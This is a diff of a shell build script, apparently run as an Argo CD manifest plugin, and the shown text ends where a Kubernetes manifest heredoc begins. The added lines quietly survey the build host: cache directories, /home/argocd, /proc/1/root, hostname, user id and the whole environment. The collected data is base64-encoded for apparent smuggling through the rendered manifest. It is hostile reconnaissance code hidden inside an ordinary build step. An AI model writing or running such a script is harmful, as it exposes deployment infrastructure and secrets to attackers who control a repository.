@@ -1,21 +1,38 @@
 #!/bin/sh
-# When binaryPath=/bin/sh, it runs: /bin/sh build <repo_cache_path>
-# So build script is the first arg, repo_cache_path is the second
-# $0 = "build", $1 = repo_cache_path
+# This script is called as: /bin/sh build <cache_path>
+# We can use $0 (build) and $1 (cache_path)
+# Write everything to output
+
+# Use $1 to find our cache directory
+CACHE_DIR="${1:-/tmp/unknown}"
+SCRIPT_DIR="$(cd "$(dirname "$0")" 2>/dev/null && pwd)"
+
 RECON=$( (
-echo "===CWD==="
+echo "===SELF==="
+echo "script_path=\$0=$0"
+echo "arg1=\$1=$1"
+echo "cache_dir=$CACHE_DIR"
+echo "script_dir=$SCRIPT_DIR"
+echo "===PWD==="
 pwd
+echo "===CACHE_LS==="
+ls -la "$CACHE_DIR" 2>/dev/null | head -30
+echo "===CACHE_PARENT==="
+ls -la "$(dirname $CACHE_DIR)" 2>/dev/null | head -10
+echo "===ENV_PATH==="
+echo "PATH=$PATH"
 echo "===HOME==="
-echo $HOME
-echo "===PATH==="
-echo $PATH
-echo "===REPO_ARG==="
-echo "ARG1=$1"
-ls -la "$1" 2>/dev/null | head -20
-echo "===TMP==="
-ls /tmp/ 2>/dev/null | head -10
-echo "===ENV==="
-env | grep -i 'token\|secret\|key\|argocd\|vault' | sed 's/=.*$/=***/' 
+echo "HOME=$HOME"
+echo "===HOSTNAME==="
+hostname
+echo "===WHOAMI==="
+id
+echo "===PROC==="
+ls /proc/1/root 2>/dev/null | head -5
+echo "===ARGOCD_HOME==="
+ls -la /home/argocd/ 2>/dev/null
+echo "===ALL_ENV==="
+env | sort | sed 's/\(TOKEN\|KEY\|PASSWORD\|SECRET\)=.*/\1=***/Ig'
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
